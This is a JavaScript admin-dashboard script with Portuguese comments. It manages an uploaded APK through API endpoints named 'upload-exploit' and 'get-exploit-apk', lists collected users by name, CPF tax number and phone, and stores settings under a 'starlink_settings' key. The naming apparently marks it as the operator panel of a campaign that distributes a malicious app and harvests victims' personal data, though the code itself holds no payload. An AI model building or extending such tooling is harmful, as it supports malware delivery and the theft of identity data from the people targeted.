// API Base URL
const API_URL = 'http://localhost:3000/api';

// Elementos DOM
const menuToggle = document.getElementById('menuToggle');
const sidebar = document.querySelector('.sidebar');
const navItems = document.querySelectorAll('.nav-item');
const pageTitle = document.getElementById('pageTitle');
const pages = document.querySelectorAll('.page');

// Inicialização
document.addEventListener('DOMContentLoaded', () => {
    initNavigation();
    initDashboard();
    initAPKManagement();
    initUsers();
    initSettings();
    updateStats();
});

// Navegação
function initNavigation() {
    // Toggle sidebar mobile
    menuToggle.addEventListener('click', () => {
        sidebar.classList.toggle('active');
    });

    // Navegação entre páginas
    navItems.forEach(item => {
        item.addEventListener('click', (e) => {
            e.preventDefault();
            const page = item.dataset.page;
            
            // Atualizar nav active
            navItems.forEach(nav => nav.classList.remove('active'));
            item.classList.add('active');
            
            // Atualizar página
            pages.forEach(p => p.classList.remove('active'));
            document.getElementById(`page-${page}`).classList.add('active');
            
            // Atualizar título
            const titles = {
                'dashboard': 'Dashboard',
                'apk': 'Gerenciar APK',
                'users': 'Usuários',
                'settings': 'Configurações'
            };
            pageTitle.textContent = titles[page];
            
            // Fechar sidebar mobile
            if (window.innerWidth <= 768) {
                sidebar.classList.remove('active');
            }
            
            // Atualizar dados da página
            if (page === 'dashboard') updateStats();
            if (page === 'apk') loadAPKInfo();
            if (page === 'users') loadUsers();
        });
    });
}

// Dashboard
function initDashboard() {
    // Atualizar atividade recente
    const activities = [
        { icon: '👤', title: 'Novo usuário cadastrado', time: '2 minutos atrás' },
        { icon: '📱', title: 'APK atualizado', time: '15 minutos atrás' },
        { icon: '✅', title: 'Configuração salva', time: '1 hora atrás' },
        { icon: '🔄', title: 'Backup do banco realizado', time: '3 horas atrás' }
    ];
    
    const activityList = document.getElementById('activityList');
    activityList.innerHTML = activities.map(activity => `
        <div class="activity-item">
            <span class="activity-icon">${activity.icon}</span>
            <div class="activity-content">
                <p class="activity-title">${activity.title}</p>
                <p class="activity-time">${activity.time}</p>
            </div>
        </div>
    `).join('');
}

async function updateStats() {
    try {
        // Buscar total de usuários
        const usersResponse = await fetch(`${API_URL}/users`);
        const users = await usersResponse.json();
        document.getElementById('totalUsers').textContent = users.length;
        
        // Buscar status do APK
        const apkResponse = await fetch(`${API_URL}/get-exploit-apk`);
        const apkData = await apkResponse.json();
        document.getElementById('apkStatus').textContent = apkData.apkUrl ? 'Ativo' : 'Inativo';
        
        // Calcular tempo online (simulado)
        const uptime = Math.floor(Math.random() * 1000) + 10;
        document.getElementById('serverUptime').textContent = `${uptime}m`;
        
        // Tamanho do banco (simulado)
        const dbSize = (Math.random() * 5 + 1).toFixed(1);
        document.getElementById('dbSize').textContent = `${dbSize} MB`;
        
    } catch (error) {
        console.error('Erro ao atualizar stats:', error);
    }
}

// APK Management
function initAPKManagement() {
    const uploadArea = document.getElementById('uploadArea');
    const apkFile = document.getElementById('apkFile');
    const selectFileBtn = document.getElementById('selectFileBtn');
    const uploadProgress = document.getElementById('uploadProgress');
    const progressFill = document.getElementById('progressFill');
    const progressText = document.getElementById('progressText');
    const uploadResult = document.getElementById('uploadResult');

    // Clique na área de upload
    uploadArea.addEventListener('click', () => apkFile.click());

    // Clique no botão
    selectFileBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        apkFile.click();
    });

    // Drag and drop
    uploadArea.addEventListener('dragover', (e) => {
        e.preventDefault();
        uploadArea.classList.add('dragover');
    });

    uploadArea.addEventListener('dragleave', () => {
        uploadArea.classList.remove('dragover');
    });

    uploadArea.addEventListener('drop', (e) => {
        e.preventDefault();
        uploadArea.classList.remove('dragover');
        const files = e.dataTransfer.files;
        if (files.length > 0) {
            handleFileUpload(files[0]);
        }
    });

    // Mudança no input file
    apkFile.addEventListener('change', (e) => {
        if (e.target.files.length > 0) {
            handleFileUpload(e.target.files[0]);
        }
    });

    async function handleFileUpload(file) {
        if (!file.name.endsWith('.apk')) {
            alert('Por favor, selecione um arquivo APK válido.');
            return;
        }

        // Mostrar progresso
        uploadProgress.style.display = 'block';
        uploadResult.style.display = 'none';
        progressFill.style.width = '0%';
        progressText.textContent = 'Iniciando upload...';

        const formData = new FormData();
        formData.append('apk', file);

        try {
            // Simular progresso
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += Math.random() * 20;
                if (progress > 80) progress = 80;
                progressFill.style.width = `${progress}%`;
                progressText.textContent = `Enviando... ${Math.floor(progress)}%`;
            }, 300);

            // Upload real
            const response = await fetch(`${API_URL}/upload-exploit`, {
                method: 'POST',
                body: formData
            });

            clearInterval(progressInterval);
            progressFill.style.width = '100%';
            progressText.textContent = 'Finalizando...';

            if (response.ok) {
                const result = await response.json();
                uploadProgress.style.display = 'none';
                uploadResult.style.display = 'block';
                setTimeout(() => {
                    loadAPKInfo();
                    updateStats();
                }, 2000);
            } else {
                throw new Error('Upload falhou');
            }
        } catch (error) {
            console.error('Erro no upload:', error);
            alert('Erro ao fazer upload do APK');
            uploadProgress.style.display = 'none';
        }
    }
}

async function loadAPKInfo() {
    try {
        const response = await fetch(`${API_URL}/get-exploit-apk`);
        const data = await response.json();
        
        document.getElementById('currentApkUrl').textContent = data.apkUrl || 'Nenhum APK configurado';
        
        const statusBadge = document.getElementById('apkStatusBadge');
        if (data.apkUrl) {
            statusBadge.textContent = 'Ativo';
            statusBadge.className = 'info-value status-badge active';
        } else {
            statusBadge.textContent = 'Inativo';
            statusBadge.className = 'info-value status-badge inactive';
        }
        
        document.getElementById('lastUpdate').textContent = new Date().toLocaleString('pt-BR');
    } catch (error) {
        console.error('Erro ao carregar APK:', error);
    }
}

// Users
function initUsers() {
    const refreshBtn = document.getElementById('refreshUsers');
    const searchInput = document.getElementById('searchUsers');

    refreshBtn.addEventListener('click', loadUsers);

    searchInput.addEventListener('input', (e) => {
        const searchTerm = e.target.value.toLowerCase();
        const rows = document.querySelectorAll('#usersTableBody tr');
        
        rows.forEach(row => {
            const name = row.cells[1]?.textContent.toLowerCase() || '';
            const cpf = row.cells[2]?.textContent.toLowerCase() || '';
            
            if (name.includes(searchTerm) || cpf.includes(searchTerm)) {
                row.style.display = '';
            } else {
                row.style.display = 'none';
            }
        });
    });
}

async function loadUsers() {
    try {
        const response = await fetch(`${API_URL}/users`);
        const users = await response.json();
        
        const tbody = document.getElementById('usersTableBody');
        
        if (users.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; padding: 40px;">Nenhum usuário cadastrado</td></tr>';
            return;
        }
        
        tbody.innerHTML = users.map(user => `
            <tr>
                <td>${user.id}</td>
                <td>${user.name || 'N/A'}</td>
                <td>${user.cpf || 'N/A'}</td>
                <td>${user.phone || 'N/A'}</td>
                <td>${new Date(user.created_at).toLocaleDateString('pt-BR')}</td>
                <td>
                    <button class="action-btn view" onclick="viewUser(${user.id})">Ver</button>
                    <button class="action-btn delete" onclick="deleteUser(${user.id})">Excluir</button>
                </td>
            </tr>
        `).join('');
    } catch (error) {
        console.error('Erro ao carregar usuários:', error);
    }
}

function viewUser(id) {
    alert(`Visualizar usuário ID: ${id}`);
}

async function deleteUser(id) {
    if (!confirm('Tem certeza que deseja excluir este usuário?')) return;
    
    try {
        const response = await fetch(`${API_URL}/users/${id}`, {
            method: 'DELETE'
        });
        
        if (response.ok) {
            loadUsers();
            updateStats();
        } else {
            alert('Erro ao excluir usuário');
        }
    } catch (error) {
        console.error('Erro ao excluir usuário:', error);
        alert('Erro ao excluir usuário');
    }
}

// Settings
function initSettings() {
    const saveBtn = document.getElementById('saveSettings');
    const resetBtn = document.getElementById('resetSettings');

    saveBtn.addEventListener('click', () => {
        const settings = {
            port: document.getElementById('serverPort').value,
            baseUrl: document.getElementById('baseUrl').value,
            uploadPath: document.getElementById('uploadPath').value
        };
        
        // Salvar no localStorage (simulado)
        localStorage.setItem('starlink_settings', JSON.stringify(settings));
        alert('Configurações salvas com sucesso!');
    });

    resetBtn.addEventListener('click', () => {
        if (confirm('Resetar todas as configurações?')) {
            document.getElementById('serverPort').value = '3000';
            document.getElementById('baseUrl').value = 'http://localhost:3000';
            document.getElementById('uploadPath').value = './uploads';
            localStorage.removeItem('starlink_settings');
            alert('Configurações resetadas!');
        }
    });

    // Carregar configurações salvas
    const savedSettings = localStorage.getItem('starlink_settings');
    if (savedSettings) {
        const settings = JSON.parse(savedSettings);
        document.getElementById('serverPort').value = settings.port || '3000';
        document.getElementById('baseUrl').value = settings.baseUrl || 'http://localhost:3000';
        document.getElementById('uploadPath').value = settings.uploadPath || './uploads';
    }
}

// Adicionar endpoint de usuários no backend
// (Isso será feito no server.js)